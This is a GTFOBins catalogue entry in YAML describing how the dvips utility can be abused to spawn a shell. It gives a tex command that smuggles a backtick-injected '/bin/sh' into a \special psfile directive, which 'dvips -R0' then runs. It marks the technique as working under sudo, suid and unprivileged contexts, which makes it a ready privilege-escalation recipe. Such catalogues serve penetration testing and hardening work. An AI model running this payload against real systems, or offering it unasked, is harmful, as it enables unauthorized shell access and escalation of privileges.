<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/dvips -->
---
functions:
  shell:
  - code: |-
      dvips -R0 texput.dvi
    comment: |-
      The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.

      ```
      tex '\special{psfile="`/bin/sh 1>&0"}\end'
      ```
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
